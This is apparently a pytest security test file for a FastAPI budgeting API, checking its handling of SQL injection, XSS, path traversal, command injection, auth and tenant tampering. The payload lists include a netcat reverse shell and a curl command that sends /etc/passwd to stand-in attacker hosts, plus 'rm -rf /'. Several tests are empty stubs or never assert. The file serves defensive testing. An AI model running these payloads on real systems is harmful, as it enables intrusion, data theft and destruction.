"""Comprehensive security validation tests."""
import pytest
from fastapi.testclient import TestClient
from httpx import AsyncClient
import json
import time
from unittest.mock import patch

# SQL Injection test payloads
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; DELETE FROM budgets WHERE 1=1; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "' OR 'x'='x",
    "1'; EXEC xp_cmdshell('dir'); --",
    "'; SHUTDOWN; --"
]

# XSS test payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<style>@import'javascript:alert(\"XSS\")';</style>"
]

# Command injection payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "; nc -e /bin/sh attacker.com 4444",
    "$(whoami)",
    "`id`",
    "; curl http://evil.com/$(cat /etc/passwd)",
    "|| ping -c 10 evil.com"
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//etc//passwd",
    "%2e%2e%2f%2e%2e%2f/etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "file:///etc/passwd",
    "/var/log/../../etc/passwd"
]


@pytest.mark.security
class TestSQLInjectionPrevention:
    """Test SQL injection prevention across all endpoints."""
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_user_endpoints_sql_injection(self, test_client, auth_headers, payload):
        """Test SQL injection prevention in user endpoints."""
        # Test user creation
        user_data = {
            "email": f"{payload}@example.com",
            "auth0_user_id": f"auth0|{payload}",
            "name": payload,
            "given_name": payload,
            "family_name": payload
        }
        
        response = test_client.post(
            "/api/v1/users",
            json=user_data,
            headers=auth_headers
        )
        
        # Should not cause database errors
        assert response.status_code in [201, 422]
        
        # Test user search with malicious query
        response = test_client.get(
            f"/api/v1/users?name={payload}",
            headers=auth_headers
        )
        
        assert response.status_code in [200, 400, 422]
        
        # Verify system is still functional
        health_response = test_client.get("/health")
        assert health_response.status_code == 200
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_budget_endpoints_sql_injection(self, test_client, auth_headers, payload):
        """Test SQL injection prevention in budget endpoints."""
        # Test budget creation
        budget_data = {
            "name": payload,
            "description": payload,
            "total_amount": 1000.00,
            "period_type": "monthly",
            "start_date": "2024-02-01",
            "end_date": "2024-02-29"
        }
        
        response = test_client.post(
            "/api/v1/budgets",
            json=budget_data,
            headers=auth_headers
        )
        
        assert response.status_code in [201, 422]
        
        # Test budget search
        response = test_client.get(
            f"/api/v1/budgets?name={payload}",
            headers=auth_headers
        )
        
        assert response.status_code in [200, 400, 422]
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_transaction_endpoints_sql_injection(self, test_client, auth_headers, payload):
        """Test SQL injection prevention in transaction endpoints."""
        # Test transaction creation
        transaction_data = {
            "description": payload,
            "amount": -100.00,
            "category": payload,
            "merchant_name": payload,
            "transaction_date": "2024-02-01"
        }
        
        response = test_client.post(
            "/api/v1/transactions",
            json=transaction_data,
            headers=auth_headers
        )
        
        assert response.status_code in [201, 422]
    
    def test_sql_injection_in_headers(self, test_client):
        """Test SQL injection attempts through headers."""
        malicious_headers = {
            "Authorization": f"Bearer {SQL_INJECTION_PAYLOADS[0]}",
            "X-Tenant-ID": SQL_INJECTION_PAYLOADS[1],
            "User-Agent": SQL_INJECTION_PAYLOADS[2],
            "Content-Type": "application/json"
        }
        
        response = test_client.get(
            "/api/v1/users",
            headers=malicious_headers
        )
        
        # Should handle malicious headers gracefully
        assert response.status_code in [401, 403, 400, 422]
        
        # System should still be functional
        health_response = test_client.get("/health")
        assert health_response.status_code == 200


@pytest.mark.security
class TestXSSPrevention:
    """Test XSS prevention across all endpoints."""
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_user_data(self, test_client, auth_headers, payload):
        """Test XSS prevention in user data fields."""
        user_data = {
            "email": "test@example.com",
            "auth0_user_id": "auth0|test123",
            "name": payload,
            "given_name": payload,
            "family_name": payload
        }
        
        response = test_client.post(
            "/api/v1/users",
            json=user_data,
            headers=auth_headers
        )
        
        if response.status_code == 201:
            data = response.json()
            # Should sanitize or escape XSS content
            assert "<script>" not in data.get("name", "")
            assert "javascript:" not in data.get("name", "")
            assert "onerror=" not in data.get("given_name", "")
            assert "onload=" not in data.get("family_name", "")
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_budget_data(self, test_client, auth_headers, payload):
        """Test XSS prevention in budget data fields."""
        budget_data = {
            "name": payload,
            "description": payload,
            "total_amount": 1000.00,
            "period_type": "monthly",
            "start_date": "2024-02-01",
            "end_date": "2024-02-29"
        }
        
        response = test_client.post(
            "/api/v1/budgets",
            json=budget_data,
            headers=auth_headers
        )
        
        if response.status_code == 201:
            data = response.json()
            # Should sanitize XSS content
            assert "<script>" not in data.get("name", "")
            assert "javascript:" not in data.get("description", "")
            assert "onerror=" not in data.get("name", "")
    
    def test_xss_in_error_messages(self, test_client):
        """Test that XSS payloads don't appear in error messages."""
        xss_payload = "<script>alert('XSS')</script>"
        
        # Try to trigger error with XSS payload
        response = test_client.get(
            f"/api/v1/users/{xss_payload}",
            headers={"Authorization": "Bearer invalid-token"}
        )
        
        response_text = response.text.lower()
        assert "<script>" not in response_text
        assert "javascript:" not in response_text
        assert "onerror=" not in response_text


@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication security measures."""
    
    def test_jwt_token_validation(self, test_client):
        """Test JWT token validation security."""
        # Test with invalid tokens
        invalid_tokens = [
            "invalid.jwt.token",
            "Bearer invalid",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid",
            "malformed-token",
            "",
            "Bearer ",
            "a" * 1000  # Very long token
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = test_client.get("/api/v1/users", headers=headers)
            assert response.status_code in [401, 403, 422]
    
    def test_token_expiry_handling(self, test_client):
        """Test handling of expired tokens."""
        # Mock expired token
        expired_token = "expired.jwt.token"
        headers = {"Authorization": f"Bearer {expired_token}"}
        
        response = test_client.get("/api/v1/users", headers=headers)
        assert response.status_code == 401
        
        # Should not expose token in error response
        response_text = response.text.lower()
        assert expired_token not in response_text
    
    def test_authorization_header_manipulation(self, test_client):
        """Test manipulation of authorization headers."""
        malicious_headers = [
            {"Authorization": "Bearer token; DROP TABLE users;"},
            {"Authorization": "Bearer <script>alert('xss')</script>"},
            {"Authorization": "Bearer ../../../etc/passwd"},
            {"Authorization": "Bearer $(rm -rf /)"},
            {"Authorization": "Bearer \x00\x01\x02\x03"}  # Null bytes
        ]
        
        for headers in malicious_headers:
            response = test_client.get("/api/v1/users", headers=headers)
            assert response.status_code in [401, 403, 400, 422]
    
    def test_session_fixation_prevention(self, test_client):
        """Test session fixation prevention."""
        # This would test that new sessions are created upon login
        # and old sessions are invalidated
        pass
    
    def test_concurrent_login_attempts(self, test_client):
        """Test handling of concurrent login attempts."""
        # This would test rate limiting and account lockout
        pass


@pytest.mark.security
class TestAuthorizationSecurity:
    """Test authorization security measures."""
    
    def test_tenant_isolation_bypass_attempts(self, test_client):
        """Test attempts to bypass tenant isolation."""
        # Try various tenant header manipulations
        malicious_tenant_headers = [
            {"X-Tenant-ID": "../admin"},
            {"X-Tenant-ID": "'; DROP TABLE tenants; --"},
            {"X-Tenant-ID": "*"},
            {"X-Tenant-ID": "admin\x00"},
            {"X-Tenant-ID": "../../etc/passwd"},
            {"Authorization": "Bearer valid-token", "X-Tenant-ID": "null"},
            {"Authorization": "Bearer valid-token", "X-Tenant-ID": "undefined"}
        ]
        
        for headers in malicious_tenant_headers:
            response = test_client.get("/api/v1/users", headers=headers)
            assert response.status_code in [401, 403, 404, 400, 422]
    
    def test_privilege_escalation_attempts(self, test_client, auth_headers):
        """Test attempts to escalate privileges."""
        # Try to access admin endpoints with regular user token
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/tenants", 
            "/api/v1/admin/system-settings",
            "/api/v1/system/health/detailed"
        ]
        
        for endpoint in admin_endpoints:
            response = test_client.get(endpoint, headers=auth_headers)
            assert response.status_code in [403, 404, 401]
    
    def test_cross_tenant_access_attempts(self, test_client):
        """Test attempts to access cross-tenant resources."""
        # This would test accessing resources from different tenants
        pass
    
    def test_role_based_access_control(self, test_client):
        """Test role-based access control enforcement."""
        # Test that users can only access resources appropriate to their role
        pass


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation security measures."""
    
    def test_buffer_overflow_attempts(self, test_client, auth_headers):
        """Test protection against buffer overflow attempts."""
        # Very long strings
        long_string = "A" * 100000
        
        user_data = {
            "email": "test@example.com",
            "auth0_user_id": "auth0|test",
            "name": long_string,
            "given_name": long_string,
            "family_name": long_string
        }
        
        response = test_client.post(
            "/api/v1/users",
            json=user_data,
            headers=auth_headers
        )
        
        # Should handle large inputs gracefully
        assert response.status_code in [413, 422]
    
    def test_null_byte_injection(self, test_client, auth_headers):
        """Test protection against null byte injection."""
        null_byte_payloads = [
            "test\x00.txt",
            "normal\x00'; DROP TABLE users; --",
            "file.txt\x00.exe",
            "data\x00<script>alert('xss')</script>"
        ]
        
        for payload in null_byte_payloads:
            user_data = {
                "email": "test@example.com",
                "auth0_user_id": "auth0|test",
                "name": payload
            }
            
            response = test_client.post(
                "/api/v1/users",
                json=user_data,
                headers=auth_headers
            )
            
            assert response.status_code in [201, 422]
            
            if response.status_code == 201:
                data = response.json()
                # Null bytes should be sanitized
                assert "\x00" not in data.get("name", "")
    
    def test_unicode_normalization_attacks(self, test_client, auth_headers):
        """Test protection against Unicode normalization attacks."""
        unicode_payloads = [
            "admin\u2044\u2044admin",  # Unicode slash
            "\u0061\u0308dmin",        # Unicode combining characters
            "\ufeffadmin",             # BOM character
            "test\u200badmin"          # Zero-width space
        ]
        
        for payload in unicode_payloads:
            user_data = {
                "email": "test@example.com",
                "auth0_user_id": "auth0|test",
                "name": payload
            }
            
            response = test_client.post(
                "/api/v1/users",
                json=user_data,
                headers=auth_headers
            )
            
            assert response.status_code in [201, 422]
    
    def test_content_type_validation(self, test_client, auth_headers):
        """Test content type validation."""
        # Try different content types
        malicious_content_types = [
            "application/json; charset=utf-7",
            "text/html",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "application/xml"
        ]
        
        for content_type in malicious_content_types:
            headers = {**auth_headers, "Content-Type": content_type}
            
            response = test_client.post(
                "/api/v1/users",
                data='{"name": "test"}',
                headers=headers
            )
            
            # Should validate content type appropriately
            assert response.status_code in [415, 422, 400]


@pytest.mark.security
class TestRateLimitingSecurity:
    """Test rate limiting security measures."""
    
    def test_api_rate_limiting(self, test_client, auth_headers):
        """Test API rate limiting."""
        # Make rapid requests to test rate limiting
        responses = []
        for i in range(50):  # Make 50 rapid requests
            response = test_client.get("/api/v1/users", headers=auth_headers)
            responses.append(response)
            
            # If we hit rate limit, break
            if response.status_code == 429:
                break
        
        # Should eventually hit rate limit
        rate_limited = any(r.status_code == 429 for r in responses)
        # Note: This test depends on rate limiting implementation
    
    def test_login_rate_limiting(self, test_client):
        """Test login endpoint rate limiting."""
        # Make multiple failed login attempts
        login_data = {
            "access_token": "invalid-token",
            "id_token": "invalid-token"
        }
        
        responses = []
        for i in range(20):  # 20 failed attempts
            response = test_client.post("/api/v1/auth/login", json=login_data)
            responses.append(response)
            
            if response.status_code == 429:
                break
            
            time.sleep(0.1)  # Small delay between attempts
        
        # Should eventually be rate limited
        rate_limited = any(r.status_code == 429 for r in responses)
        # Note: This test depends on rate limiting implementation
    
    def test_per_user_rate_limiting(self, test_client):
        """Test per-user rate limiting."""
        # This would test that rate limits are applied per user
        # rather than globally
        pass


@pytest.mark.security
class TestSecurityHeaders:
    """Test security headers are properly set."""
    
    def test_security_headers_present(self, test_client):
        """Test that security headers are present in responses."""
        response = test_client.get("/health")
        
        # Check for important security headers
        headers_to_check = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        for header in headers_to_check:
            # Not all headers may be implemented, so we check if present
            if header in response.headers:
                assert response.headers[header] is not None
    
    def test_no_sensitive_headers_exposed(self, test_client):
        """Test that sensitive headers are not exposed."""
        response = test_client.get("/health")
        
        # Headers that should not be exposed
        sensitive_headers = [
            "Server",
            "X-Powered-By",
            "X-AspNet-Version",
            "X-AspNetMvc-Version"
        ]
        
        for header in sensitive_headers:
            assert header not in response.headers
    
    def test_cors_headers_security(self, test_client):
        """Test CORS headers security."""
        # Test OPTIONS request
        response = test_client.options("/api/v1/users")
        
        if "Access-Control-Allow-Origin" in response.headers:
            # Should not allow all origins in production
            assert response.headers["Access-Control-Allow-Origin"] != "*"
        
        if "Access-Control-Allow-Methods" in response.headers:
            # Should only allow necessary methods
            allowed_methods = response.headers["Access-Control-Allow-Methods"]
            dangerous_methods = ["TRACE", "CONNECT"]
            for method in dangerous_methods:
                assert method not in allowed_methods


@pytest.mark.security
class TestDataExposurePrevention:
    """Test prevention of sensitive data exposure."""
    
    def test_password_fields_not_exposed(self, test_client, auth_headers):
        """Test that password fields are never exposed in responses."""
        # This would test that any password-related fields
        # are not included in API responses
        pass
    
    def test_internal_ids_not_exposed(self, test_client, auth_headers):
        """Test that internal database IDs are not exposed."""
        # Test that only public UUIDs are exposed, not internal auto-increment IDs
        response = test_client.get("/api/v1/users", headers=auth_headers)
        
        if response.status_code == 200:
            data = response.json()
            users = data if isinstance(data, list) else data.get("users", [])
            
            for user in users:
                user_id = user.get("id")
                if user_id:
                    # Should be UUID format, not sequential integer
                    assert len(user_id) >= 32  # UUID minimum length
                    assert not user_id.isdigit()  # Not a simple integer
    
    def test_error_messages_dont_expose_internals(self, test_client):
        """Test that error messages don't expose internal information."""
        # Try to access non-existent resource
        response = test_client.get("/api/v1/users/non-existent-id")
        
        if response.status_code == 404:
            error_message = response.json().get("message", "")
            
            # Should not expose database details
            sensitive_terms = [
                "table", "column", "database", "sql", "constraint",
                "foreign key", "index", "schema", "connection"
            ]
            
            for term in sensitive_terms:
                assert term not in error_message.lower()
    
    def test_stack_traces_not_exposed(self, test_client):
        """Test that stack traces are not exposed in error responses."""
        # Try to trigger an error condition
        response = test_client.post(
            "/api/v1/users",
            json={"invalid": "data"},
            headers={"Authorization": "Bearer invalid-token"}
        )
        
        response_text = response.text.lower()
        
        # Should not contain stack trace information
        stack_trace_indicators = [
            "traceback", "file \"", "line ", "function", 
            "exception", "error at", "stack trace"
        ]
        
        for indicator in stack_trace_indicators:
            assert indicator not in response_text


@pytest.mark.security
class TestFileUploadSecurity:
    """Test file upload security measures."""
    
    def test_file_type_validation(self, test_client, auth_headers):
        """Test file type validation for uploads."""
        # This would test file upload endpoints if they exist
        # Testing that only allowed file types are accepted
        pass
    
    def test_file_size_limits(self, test_client, auth_headers):
        """Test file size limits."""
        # This would test that file uploads respect size limits
        pass
    
    def test_malicious_file_detection(self, test_client, auth_headers):
        """Test detection of malicious files."""
        # This would test that malicious files (executables, scripts) are rejected
        pass


@pytest.mark.security
class TestBusinessLogicSecurity:
    """Test business logic security vulnerabilities."""
    
    def test_price_manipulation_prevention(self, test_client, auth_headers):
        """Test prevention of price manipulation attacks."""
        # Test negative amounts, zero amounts, etc.
        budget_data = {
            "name": "Negative Budget",
            "total_amount": -1000.00,  # Negative amount
            "period_type": "monthly",
            "start_date": "2024-02-01",
            "end_date": "2024-02-29"
        }
        
        response = test_client.post(
            "/api/v1/budgets",
            json=budget_data,
            headers=auth_headers
        )
        
        # Should prevent negative amounts
        assert response.status_code == 422
    
    def test_quantity_manipulation_prevention(self, test_client, auth_headers):
        """Test prevention of quantity manipulation."""
        # Test with very large quantities, negative quantities, etc.
        pass
    
    def test_workflow_bypass_prevention(self, test_client, auth_headers):
        """Test prevention of workflow bypass attacks."""
        # Test that required workflow steps cannot be bypassed
        pass
    
    def test_time_based_attacks_prevention(self, test_client, auth_headers):
        """Test prevention of time-based attacks."""
        # Test that time-sensitive operations are properly validated
        pass